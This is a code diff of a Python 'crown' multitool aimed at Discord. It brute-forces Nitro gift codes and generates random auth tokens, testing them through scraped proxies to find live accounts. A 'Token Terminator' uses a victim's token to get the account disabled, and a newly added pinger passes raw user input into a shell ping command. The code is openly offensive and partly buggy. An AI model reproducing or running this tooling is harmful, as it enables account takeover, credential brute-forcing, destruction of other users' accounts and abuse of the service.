@@ -1,24 +1,36 @@
-import os, random, string, time, ctypes, sys, requests, base64, json
+import os
+import random
+import string
+import time
+import ctypes
+import sys
+import requests
+import base64
+import json
 from colorama import Fore
 from itertools import cycle
 from random import randint
 from lxml.html import fromstring
 import traceback
 
-def slowprint(s, c, newLine = True):
-	for c in s + '\n':
-		sys.stdout.write(c); sys.stdout.flush(); time.sleep(1./30)
+
+def slowprint(s, c, newLine=True):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(1. / 30)
+
 
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     if os.name == 'nt':
         os.system("title crown")
-    else: 
+    else:
         print('crown')
 
-    print(f'''            
+    print(f'''
 
-                                     
+
     {Fore.RED}                                  ░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗{Fore.RESET}
     {Fore.LIGHTRED_EX}                                  ██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║{Fore.RESET}
     {Fore.YELLOW}                                  ██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝██╔██╗██║{Fore.RESET}
@@ -28,7 +40,8 @@ def main():
                ''')
 
     time.sleep(2)
-    slowprint(f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}crown{Fore.RESET}', .02)
+    slowprint(
+        f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}crown{Fore.RESET}', .02)
     time.sleep(1)
 
     operation = input(f'''
@@ -38,7 +51,8 @@ def main():
                                                        [2] Token Gen and Checker
                                                        [3] Token Terminator
                                                        [4] Proxy Scraper
-                                                       [5] Exit{Fore.RESET}
+                                                       [5] Pinger
+                                                       [6] Exit{Fore.RESET}
 >''')
     if str(operation) == "1":
         generateCheck()
@@ -49,6 +63,8 @@ def main():
     elif str(operation) == "4":
         proxy()
     elif str(operation) == "5":
+        pinger()
+    elif str(operation) == "6":
         exit()
     else:
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -56,12 +72,13 @@ def main():
         time.sleep(2)
         main()
 
+
 def generateCheck():
     os.system('cls' if os.name == 'nt' else 'clear')
     while True:
         code = ''.join(random.choices(
             string.ascii_uppercase + string.digits + string.ascii_lowercase,
-            k = 16
+            k=16
         ))
 
         url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
@@ -73,7 +90,8 @@ def generateCheck():
         if 'subscription_plan' in response.text:
             print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
             print("FOUND CODE")
-            with open("code.txt", "w") as f: f.write(nitro)
+            with open("code.txt", "w") as f:
+                f.write(nitro)
             break
 
         else:
@@ -88,103 +106,192 @@ def get_proxies():
     proxies = set()
     for i in parser.xpath('//tbody/tr')[:10]:
         if i.xpath('.//td[7][contains(text(),"yes")]'):
-            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
+                             i.xpath('.//td[2]/text()')[0]])
             proxies.add(proxy)
     return proxies
 
-def terminate(): 
+
+def terminate():
     token = input("Enter the token you want to terminate: ")
     while True:
         print("Terminating token...")
         api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
         data = api.json()
-        check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
+        check = requests.get(
+            "https://discordapp.com/api/v6/guilds/" +
+            data['guild']['id'],
+            headers={
+                "Authorization": token})
         stuff = check.json()
-        requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
-        requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
+        requests.post(
+            "https://discordapp.com/api/v6/invite/hwcVZQw",
+            headers={
+                "Authorization": token})
+        requests.delete(
+            "https://discordapp.com/api/v6/guiilds" +
+            data['guild']['id'],
+            headers={
+                "Authorization": token})
 
         if stuff['code'] == 0:
             print("Successfully disabled!")
             print("Disabler by NullCode and Giggl3z")
-            time.sleep(2); break
+            time.sleep(2)
+            break
             main()
 
-            
+
 def tokengen():
 
- N = input("How many you want?: ")
- count = 0
- current_path = os.path.dirname(os.path.realpath(__file__))
- url = "https://discordapp.com/api/v6/users/@me/library"
+    N = input("How many you want?: ")
+    count = 0
+    current_path = os.path.dirname(os.path.realpath(__file__))
+    url = "https://discordapp.com/api/v6/users/@me/library"
 
-
-
- while(int(count) < int(N)):
-    tokens = []
-    base64_string = "=="
-    while(base64_string.find("==") != -1):
-        sample_string = str(randint(000000000000000000, 999999999999999999))
-        sample_string_bytes = sample_string.encode("ascii")
-        base64_bytes = base64.b64encode(sample_string_bytes)
-        base64_string = base64_bytes.decode("ascii")
-    else:
-        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
-                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-        count += 1
-        tokens.append(token)
-    proxies = get_proxies()
-    proxy_pool = cycle(proxies)
-
-    for token in tokens:
-        proxy = next(proxy_pool)
-        header = {
-            "Content-Type": "application/json",
-            "authorization": token
-        }
-        r = requests.get(url, headers=header, proxies={"http": proxy})
-        if r.status_code == 200:
-            print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
-            with open("workingtokens.txt", "a") as f: f.write(token+"\n")
-            
-        elif "rate limited." in r.text:
-            print("[-] You are being rate limited.")
-            
+    while(int(count) < int(N)):
+        tokens = []
+        base64_string = "=="
+        while(base64_string.find("==") != -1):
+            sample_string = str(
+                randint(
+                    000000000000000000,
+                    999999999999999999))
+            sample_string_bytes = sample_string.encode("ascii")
+            base64_bytes = base64.b64encode(sample_string_bytes)
+            base64_string = base64_bytes.decode("ascii")
         else:
-            print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
-    tokens.remove(token)
-    main()
+            token = base64_string + "." + random.choice(
+                string.ascii_letters).upper() + ''.join(
+                random.choice(
+                    string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
+                random.choice(
+                    string.ascii_letters + string.digits) for _ in range(27))
+            count += 1
+            tokens.append(token)
+        proxies = get_proxies()
+        proxy_pool = cycle(proxies)
+
+        for token in tokens:
+            proxy = next(proxy_pool)
+            header = {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+            r = requests.get(url, headers=header, proxies={"http": proxy})
+            if r.status_code == 200:
+                print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
+                with open("workingtokens.txt", "a") as f:
+                    f.write(token + "\n")
+
+            elif "rate limited." in r.text:
+                print("[-] You are being rate limited.")
+
+            else:
+                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
+        tokens.remove(token)
+        main()
+
 
 def proxy():
- os.system('cls')
+    os.system('cls')
 
- url = 'https://api.openproxylist.xyz/http.txt'
- r = requests.get(url)
- results = r.text
- with open ("http.txt", "w") as file:
-  file.write(results)
- print('done http')
- 
- url = 'https://api.openproxylist.xyz/socks4.txt'
- r = requests.get(url)
- results = r.text
- with open ("socks4.txt", "w") as file:
-  file.write(results)
- print('done socks4')
- 
- url = 'https://api.openproxylist.xyz/socks5.txt'
- r = requests.get(url)
- results = r.text
- with open ("socks5.txt", "w") as file:
-  file.write(results)
- print('done socks4')
- time.sleep(2)
- main()
+    url = 'https://api.openproxylist.xyz/http.txt'
+    r = requests.get(url)
+    results = r.text
+    with open("http.txt", "w") as file:
+        file.write(results)
+    print('done http')
+
+    url = 'https://api.openproxylist.xyz/socks4.txt'
+    r = requests.get(url)
+    results = r.text
+    with open("socks4.txt", "w") as file:
+        file.write(results)
+    print('done socks4')
+
+    url = 'https://api.openproxylist.xyz/socks5.txt'
+    r = requests.get(url)
+    results = r.text
+    with open("socks5.txt", "w") as file:
+        file.write(results)
+    print('done socks4')
+    time.sleep(2)
+    main()
+
+
+def pinger():
+
+
+    os.system("mode con:cols=61 lines=30")
+    os.system("@title 666 Pinger & cls")
+    print("          66666666           66666666           66666666  ")
+    time.sleep(0.17)
+    os.system("color 01")
+    print("         66666666           66666666           66666666 ")
+    time.sleep(0.17)
+    os.system("color 03")
+    print("        66666666           66666666           66666666 ")
+    time.sleep(0.17)
+    os.system("color 05")
+    print("       66666666           66666666           66666666 ")
+    time.sleep(0.17)
+    os.system("color 07")
+    print("      66666666           66666666           66666666 ")
+    time.sleep(0.17)
+    os.system("color 09")
+    print("     66666666           66666666           66666666 ")
+    time.sleep(0.17)
+    os.system("color 01")
+    print("    66666666           66666666           66666666  ")
+    time.sleep(0.17)
+    os.system("color 03")
+    print("   66666666666666     66666666666666     66666666666666 ")
+    time.sleep(0.17)
+    os.system("color 05")
+    print("  66666666666666666  66666666666666666  66666666666666666")
+    time.sleep(0.17)
+    os.system("color 07")
+    print("  666666666666666666 666666666666666666 666666666666666666 ")
+    time.sleep(0.17)
+    os.system("color 09")
+    print("  6666666     66666666666666     66666666666666     6666666")
+    time.sleep(0.17)
+    os.system("color 01")
+    print("  6666666     66666666666666     66666666666666     6666666")
+    time.sleep(0.17)
+    os.system("color 03")
+    print("  666666666666666666666666666666666666666666666666666666666")
+    time.sleep(0.17)
+    os.system("color 05")
+    print("   66666666666666666  66666666666666666  66666666666666666 ")
+    time.sleep(0.17)
+    os.system("color 07")
+    print("     6666666666666      6666666666666      6666666666666 ")
+    time.sleep(0.17)
+    os.system("color 4F")
+    print("       666666666          666666666          666666666 ")
+
+    ip = str(input("\nEnter IP fam: "))
+
+    while True:
+        if os.system("ping -n 1 " + ip + ">nul") == 0:
+            print(ip + " is alive!")
+            os.system("color " + str(random.randrange(0, 9)))
+        else:
+            print(ip + " Get downed SKID")
+            os.system("color " + str(random.randrange(0, 9)))
+            time.sleep(2)
+            os.system("mode con:cols=120lines=20")
+            main()
+
 
 def exit():
-  slowprint('bye bye darlin', .02)
-  time.sleep(2)
-  os.system('cls' if os.name == 'nt' else 'clear')
-  raise SystemExit
+    slowprint('bye bye darlin', .02)
+    time.sleep(2)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    raise SystemExit
+
 
 if __name__ == '__main__':
-  main()
+    main()
